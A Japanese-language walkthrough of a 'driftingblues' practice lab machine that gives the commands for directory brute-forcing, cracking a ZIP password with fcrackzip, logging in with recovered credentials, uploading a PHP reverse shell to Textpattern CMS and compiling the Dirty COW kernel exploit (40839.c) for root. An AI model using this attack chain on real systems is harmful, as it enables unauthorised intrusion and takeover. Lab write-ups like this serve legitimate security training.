![[Webの調査 image 3.png]]

gobuster dir -u http://192.168.15.132 -w /usr/share/wordlists/dirb/common.txt

![[Webの調査 image 4.png]]

feroxbuster -u http://192.168.15.132 -w /usr/share/dirb/wordlists/common.txt -g -x txt

![[Webの調査 image 5.png]]

![[Webの調査 image 6.png]]

/robots.txt

![[Webの調査 image 7.png]]

.zip

![[Webの調査 image 8.png]]

zipファイル探索

gobuster dir -u http://192.168.15.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip

![[Webの調査 image 9.png]]

![[Webの調査 image 10.png]]

spammer.zip

fcrackzip -u -D -p rockyou.txt spammer.zip

![[Webの調査 image 11.png]]

myspace4

![[Webの調査 image 12.png]]

mayer:lionheart

![[Webの調査 image 13.png]]

Warning "mktime(): It is not safe to rely on the system's timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone 'UTC' for now, but please set date.timezone to select your timezone.".

警告 "mktime(): システムのタイムゾーン設定に依存するのは安全ではありません。date.timezone設定またはdate_default_timezone_set()関数を使用する必要があります。これらの方法のいずれかを使用してもこの警告が表示される場合は、タイムゾーン識別子のスペルを間違えている可能性があります。今のところタイムゾーン「UTC」を選択しましたが、タイムゾーンを選択するにはdate.timezoneを設定してください。

ログイン成功

![[Webの調査 image 14.png]]

Textpattern CMS (opens an external link in a new window) (v4.8.3)

searchsploit CMS

![[Webの調査 image 15.png]]

reverse-shell-phpファイルをアップロードする

![[Webの調査 image 16.png]]

ncで待受けて先程のファイルにアクセスする

![[Webの調査 image 17.png]]

シェルゲット

python -c 'import pty; pty.spawn("/bin/bash")'

$ uname -a

Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux

exploitの検索

searchsploit linux kernel | grep "Privilege Escalation"

![[Webの調査 image 18.png]]

cp /usr/share/exploitdb/exploits/linux/local/40839.c ./

攻撃端末にWebサーバーを立ち上げて、やられ端末からアイルを取りに行く

![[Webの調査 image 19.png]]

コンパイル

gcc -pthread 40839.c -o dirty -lcrypt

chmod +x dirty

./dirty

passwordはpasswdを設定（任意）

![[Webの調査 image 40.png]]

フラグの取得

![[Webの調査 image 41.png]]